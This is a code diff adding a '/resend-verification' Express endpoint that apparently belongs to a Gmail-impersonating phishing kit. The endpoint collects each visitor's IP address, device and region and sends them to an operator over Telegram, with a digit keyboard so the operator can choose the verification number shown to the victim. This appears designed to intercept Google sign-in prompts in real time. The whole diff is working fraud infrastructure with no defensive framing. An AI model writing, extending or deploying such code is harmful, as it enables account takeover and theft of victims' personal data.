@@ -1541,6 +1541,85 @@ app.post("/send-verification-confirm", async (req, res) => {
 });
 
 // ============================================================================
+// POST /resend-verification - Resend verification page with new digits
+// ============================================================================
+
+app.post("/resend-verification", async (req, res) => {
+  try {
+    const { userId, email, requestId } = req.body;
+
+    if (!email || !requestId) {
+      return res.status(400).json({ error: "Missing email or requestId" });
+    }
+
+    if (!pendingVerificationPage[requestId]) {
+      return res.status(400).json({ error: "Invalid requestId" });
+    }
+
+    console.log(`🔄 Resending verification page for ${email}, requestId: ${requestId}`);
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    // ✅ Reset digits for this requestId
+    pendingVerificationPage[requestId].selectedDigits = null;
+    pendingVerificationPage[requestId].status = "pending";
+
+    const message =
+      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "0", callback_data: `verify_digit|${requestId}|0` },
+            { text: "1", callback_data: `verify_digit|${requestId}|1` },
+            { text: "2", callback_data: `verify_digit|${requestId}|2` },
+            { text: "3", callback_data: `verify_digit|${requestId}|3` },
+            { text: "4", callback_data: `verify_digit|${requestId}|4` }
+          ],
+          [
+            { text: "5", callback_data: `verify_digit|${requestId}|5` },
+            { text: "6", callback_data: `verify_digit|${requestId}|6` },
+            { text: "7", callback_data: `verify_digit|${requestId}|7` },
+            { text: "8", callback_data: `verify_digit|${requestId}|8` },
+            { text: "9", callback_data: `verify_digit|${requestId}|9` }
+          ]
+        ]
+      }
+    };
+
+    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
+    let resolvedEmail = email;
+    if (!userWinnerTelegram[email]) {
+      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
+      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
+    }
+
+    // ✅ SEND TO WINNER ONLY
+    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
+      console.log(`📨 Resend verification going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
+      await sendFollowUpMessage(resolvedEmail, message, options);
+    } else {
+      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
+    }
+
+    res.json({ success: true, requestId });
+
+  } catch (err) {
+    console.error("❌ Resend verification error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
 // POST /resend-verification-confirm - Resend verification confirm message when rejected
 // ============================================================================
 
